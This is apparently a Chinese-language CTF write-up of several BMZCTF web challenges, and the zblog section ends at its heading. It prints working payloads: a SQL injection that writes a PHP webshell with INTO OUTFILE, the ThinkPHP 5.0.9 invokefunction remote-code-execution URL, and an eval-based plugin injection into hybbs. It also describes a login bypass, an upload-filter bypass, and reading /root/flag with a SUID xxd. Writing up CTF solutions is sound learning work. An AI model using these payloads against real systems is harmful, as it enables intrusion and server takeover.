## sqlguncms

这是一道简单CMS页面，针对搜索框进行测试，暴漏出SQL查询语句与绝对路径

![image-20210823132505328](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823132505328.png)

payload

```
key=-1%'union select 1,2,3#
```

现在写入一句话木马

```
key=-1%'union select 1,'<?php system($_GET[x]);?>',3 into outfile '/var/www/html/shell.php'#
```

访问`www.bmzclub.cn:20754/shell.php?x=ls /`，得到flag



## ThinkPHP

发现版本为`ThinkPHP V5.0.9`

直接利用cve

```
http://www.bmzclub.cn:20754/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /
```



## 简历系统

登陆页面可以通过万能密码进行登录

![image-20210823153538552](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823153538552.png)



登录后可以看到一个文件上传点，这里可以传一个马上去

这里只有一个文件名绕过，可以通过大小写进行绕过

![image-20210823195118627](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823195118627.png)

根目录下的log.php记录请求访问日志，所以传入php代码可被log.php记录，导致 getshell

![image-20210823195208061](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823195208061.png)

这里也可以利用内置的ping命令函数

![image-20210823194651622](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823194651622.png)

![image-20210823194612936](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823194612936.png)

直接cat /flag



## 伟大宝宝的宝藏

打开题目是hybbs2.3.2的，直接百度搜索相关漏洞即可
利用漏洞：

1. 越权遍历给admin发私信，得到密码baobao(后9位需爆破)`账户/密码：admin/baobao123456789`
2. 修改全局配置-上传后缀加php（这个方法已经失效，题目被改过）
3. 利用插件插入php代码



打开题目我们先注册一个新用户`111`，观察个人中心，猜测admin用户的个人中心为`admin.html`

![image-20210823210351648](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823210351648.png)

成功登录`admin`用户的 个人中心

![image-20210823210643489](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823210643489.png)

观察一下这个`个人中心`，在聊天发现提示，猜测是密码提示，爆破密码为：baobao123456789

![image-20210823210849402](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823210849402.png)



这之后就有三种解法

- **预期解+非预期解1**：[BMZCTF渗透测试公开赛 WP](https://mp.weixin.qq.com/s/sLwDF7c8bqpB6629dGytYg)

- 其中非预期解1参考：[[freebuf解读] hybbs getshell](https://www.freebuf.com/vuls/243833.html)

### 非预期解2

这里用到了0day

首先登录admin用户后台，我们新增一个插件，并插入恶意代码：

```
111','name' =>eval($_REQUEST[1]),//
```

![image-20210823204759532](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823204759532.png)

![image-20210823204850583](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823204850583.png)

得到咱们webshell

```
http://www.bmzclub.cn:20754/Plugin/111/conf.php?1=system('whoami');
```

![image-20210823205126425](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823205126425.png)

通过搜索文件你会看到在根目录下有一个flag.sh文件，判断flag在/root/flag，但你当前权限非root

![image-20210823205557232](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823205557232.png)

这里就需要使用suid的xxd命令获取root目录下的flag

```
xxd "/root/flag" | xxd -r
```

![image-20210823205925081](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210823205925081.png)



## zblog

